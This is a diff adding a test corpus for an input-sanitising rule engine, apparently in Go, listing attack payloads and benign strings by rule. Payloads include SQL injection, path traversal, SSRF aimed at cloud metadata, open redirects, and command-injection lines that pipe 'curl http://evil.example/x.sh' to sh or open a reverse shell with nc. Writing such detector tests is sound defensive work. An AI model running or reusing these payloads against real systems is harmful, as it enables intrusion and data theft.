@@ -1,0 +1,197 @@
+# Per-rule corpus. Each line: "<expect> <context> <payload>".
+#   expect:  a rule id that must be reported, or "ok" when no rule outside the original XSS set may be reported
+#   context: text, url, redirect, id, path, header
+#   payload: the rest of the line verbatim; a valid Go-quoted string is unquoted first (for \t \r \n).
+# Checked with the strict profile, every rule on, WithRedirectHosts("shop.example.com").
+
+# --- sql_injection ---
+sql_injection text ' OR '1'='1
+sql_injection text admin'--
+sql_injection text admin' #
+sql_injection text 1' OR 1=1 #
+sql_injection text " or ""="
+sql_injection text ') or ('a'='a
+sql_injection text ' or true--
+sql_injection text 1 or 1=1
+sql_injection text 1 UNION SELECT username, password FROM users
+sql_injection text 1 union/**/select 1,2,3
+sql_injection text 1 UNION ALL SELECT NULL--
+sql_injection text x'; DROP TABLE users; --
+sql_injection text 1; WAITFOR DELAY '0:0:5'--
+sql_injection text 1 AND SLEEP(5)
+sql_injection text 1 AND benchmark(5000000,md5(1))
+sql_injection text 1' AND extractvalue(1,concat(0x7e,version()))--
+sql_injection text SELECT * FROM information_schema.tables
+sql_injection text 1;exec xp_cmdshell('dir')
+sql_injection text 1' union select load_file('/etc/passwd')--
+sql_injection text ' into outfile '/var/www/shell.php
+sql_injection text ＇ OR ＇1＇=＇1
+sql_injection url https://shop.example.com/search?q=1%27%20OR%20%271%27%3D%271
+sql_injection id abc' OR 'x'='x
+sql_injection text 1 AND 1=CHAR(65,66,67,68)
+ok text O'Brien's "best" shop
+ok text Rock 'n' roll
+ok text 5' 11" tall
+ok text It's a "must have" or so they say
+ok text Choose "red" or "blue"
+ok text Size: 1 or 2 items
+ok text Select your size; update later
+ok text Union Jack t-shirt, select sizes
+ok text Get better sleep (8 hours a night)
+ok text -- Best seller --
+ok text Tom's -- great
+ok text Price = $5 or less
+ok text nguyen.van.a+shop@example.com
+ok text Order #1001 (paid)
+ok text He said 'hello' and left
+
+# --- nosql_operator ---
+nosql_operator text {"$gt": ""}
+nosql_operator text username[$ne]=admin
+nosql_operator text $where: function() { return true }
+nosql_operator url https://shop.example.com/login?user[$regex]=.*
+ok text Price $5
+ok text $100 off orders over $500
+ok text {"name": "a"}
+
+# --- path_traversal ---
+path_traversal path ../../etc/passwd
+path_traversal path ..\..\windows\win.ini
+path_traversal path ....//....//etc/passwd
+path_traversal path %2e%2e%2f%2e%2e%2fetc%2fpasswd
+path_traversal path %252e%252e%252fsecret
+path_traversal path file.txt/..;/admin
+path_traversal path ．．／．．／etc/passwd
+path_traversal path /etc/passwd
+path_traversal path C:\Windows\System32\drivers\etc\hosts
+path_traversal path images/../../../config
+path_traversal path ..
+path_traversal url https://shop.example.com/download?file=../../etc/passwd
+path_traversal url https://shop.example.com/static/..%2f..%2fetc/passwd
+ok path images/2026/photo..jpg
+ok path products/ao-thun.jpg
+ok path /collections/all
+ok path ..hidden
+ok path v1.2..3
+ok url https://shop.example.com/a/b?x=1
+ok text Loading... ../ in text is not a path
+
+# --- header_crlf ---
+header_crlf header "Mozilla/5.0\r\nSet-Cookie: x=1"
+header_crlf header "abc\ndef"
+header_crlf id "abc\ndef"
+header_crlf url https://shop.example.com/?a=%0d%0aSet-Cookie:x
+header_crlf redirect /account%0d%0aSet-Cookie:x
+ok header Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0 Safari/537.36
+ok text "line one\nline two"
+
+# --- command ---
+command text ; rm -rf /
+command text | curl http://evil.example/x.sh | sh
+command text $(whoami)
+command text `id`
+command text && wget http://evil.example/a
+command text ;cat /etc/passwd
+command text a;nc -e /bin/sh 10.0.0.1 4444
+command text x${IFS}cat${IFS}/etc/passwd
+command path file.txt; python -c 'import os'
+command text "a\nwhoami"
+command text | powershell -enc SQBFAFgA
+ok text salt; pepper
+ok text Tom & Jerry
+ok text rock | paper | scissors
+ok text $5 & up
+ok text Price: $(5)
+ok text Ideas; cat lovers welcome
+ok text Sleep well & dream
+
+# --- mixed_scripts ---
+mixed_scripts id pаypal
+mixed_scripts url https://аpple.com/login
+mixed_scripts text Pаssword reset
+mixed_scripts text Χerox
+ok text Москва и Moscow
+ok text Ελληνικά and English
+ok text Tiếng Việt có dấu đầy đủ
+ok text 東京 Tokyo
+ok id привет
+ok text α-test
+ok text naïve café façade
+
+# --- formula_injection ---
+formula_injection text =cmd|' /C calc'!A0
+formula_injection text =HYPERLINK("http://evil.example","click")
+formula_injection text +cmd|' /C calc'!A0
+formula_injection text -2+3+cmd|' /C calc'!A0
+formula_injection text @SUM(1+1)*cmd|' /C calc'!A0
+formula_injection text "\t=1+1"
+formula_injection text ＝1+1
+ok text -12.5
+ok text +84 912 345 678
+ok text +1 (555) 123-4567
+ok text @john great post
+ok text - item one
+ok text 100%
+
+# --- ssrf ---
+ssrf url http://127.0.0.1/admin
+ssrf url http://localhost:8080/
+ssrf url http://LOCALHOST/
+ssrf url http://localhost./
+ssrf url http://169.254.169.254/latest/meta-data/
+ssrf url http://[::1]/
+ssrf url http://[::ffff:127.0.0.1]/
+ssrf url http://[::]/
+ssrf url http://2130706433/
+ssrf url http://0x7f.0.0.1/
+ssrf url http://0177.0.0.1/
+ssrf url http://127.1/
+ssrf url http://0.0.0.0:8080/
+ssrf url http://10.0.0.5:9200/_search
+ssrf url http://192.168.1.1/
+ssrf url http://172.16.0.1/
+ssrf url http://100.100.100.200/latest/meta-data/
+ssrf url http://[fd00:ec2::254]/
+ssrf url http://metadata.google.internal/computeMetadata/v1/
+ssrf url http://evil.example@127.0.0.1/
+ssrf url http://127.0.0.1.nip.io/
+ssrf url file:///etc/passwd
+ssrf url gopher://127.0.0.1:6379/_FLUSHALL
+ssrf url http://%31%32%37.0.0.1/
+ssrf url http://127。0。0。1/
+ssrf url http:/\127.0.0.1/
+ssrf url http://[64:ff9b::7f00:1]/
+ssrf url //127.0.0.1/x
+ok url https://shop.example.com/products/x
+ok url http://1.1.1.1/
+ok url https://8.8.8.8/dns
+ok url //cdn.example.com/a.jpg
+ok url /relative/path
+ok url https://shop.example.com:8443/
+ok url https://[2001:4860:4860::8888]/
+ok url https://example.com/?next=http://127.0.0.1
+ok url mailto:a@example.com
+ok url tel:+84912345678
+ok url http://10.example.com/
+ok url https://0x.co/
+
+# --- open_redirect ---
+open_redirect redirect https://evil.example/
+open_redirect redirect //evil.example/
+open_redirect redirect /\evil.example/
+open_redirect redirect \/evil.example
+open_redirect redirect https:evil.example
+open_redirect redirect /%2f%2fevil.example
+open_redirect redirect /%5cevil.example
+open_redirect redirect https://shop.example.com.evil.example/
+open_redirect redirect https://shop.example.com@evil.example/
+open_redirect redirect "\t//evil.example"
+open_redirect redirect ftp://evil.example/
+open_redirect redirect https://evil.example\@shop.example.com/
+ok redirect /account/orders
+ok redirect /products/x?variant=1#reviews
+ok redirect https://shop.example.com/cart
+ok redirect https://checkout.shop.example.com/
+ok redirect ?page=2
+ok redirect orders/1001
+ok redirect #top
